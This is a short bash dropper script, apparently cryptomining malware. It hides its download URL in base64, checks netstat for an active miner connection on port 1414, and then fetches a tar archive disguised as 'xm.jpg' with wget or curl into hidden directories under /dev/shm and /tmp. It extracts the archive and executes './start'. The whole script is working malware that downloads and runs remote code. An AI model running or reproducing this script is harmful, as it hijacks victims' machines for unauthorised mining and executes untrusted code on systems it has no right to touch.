#!/bin/bash
echo 'here is ai.sh'
proxyport=1414
media_url=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLmpwZwo=|base64 -d)
check_exist()
{
#try other way
if [ -x /usr/bin/netstat -o /bin/netstat ]
then
for pt in $(netstat -an|grep EST|grep "$proxyport"|awk '{print $5}'|awk -F ":" '{print $NF}')
do
   if [ "$pt" == "$proxyport" ];then
   echo "miner running"
   exit 1
   else
   echo "miner may not running,check next port"
   fi
done
else
        echo "haha"
fi
}
check_exist
mkdir -p /dev/shm/.11 && cd /dev/shm/.11 && wget $media_url && tar -xf xm.jpg && chmod +x start && ./start
sleep 3
check_exist
mkdir -p /tmp/.11 && cd /tmp/.11 && curl $media_url -o xm.jpg && tar -xf xm.jpg && chmod +x start && ./start
